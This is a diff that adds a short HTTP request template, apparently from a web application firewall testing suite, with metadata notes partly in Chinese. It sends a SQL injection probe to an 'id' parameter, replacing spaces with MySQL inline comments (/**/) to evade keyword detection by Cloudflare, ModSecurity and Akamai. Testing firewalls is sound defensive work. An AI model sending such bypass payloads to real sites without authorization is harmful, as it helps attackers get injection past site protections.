@@ -1,0 +1,13 @@
+# @name: 内联注释替代空格(/**/)
+# @tags: get,sqli,comment,space,cloudflare,modsecurity,akamai,id,bypass
+# @color: cyan
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: inline_comment_space
+# @intent.param: id
+# @intent.payload: id=1'/**/and/**/'a'='a
+# @note: 参考 SQLMap space2comment，用 MySQL 内联注释 /**/ 替代空格分割关键字，绕过基于空格分词与关键字黑名单的检测（Cloudflare、ModSecurity/OWASP CRS、Akamai）。payload: id=1' and 'a'='a
+GET /?id=1'/**/and/**/'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
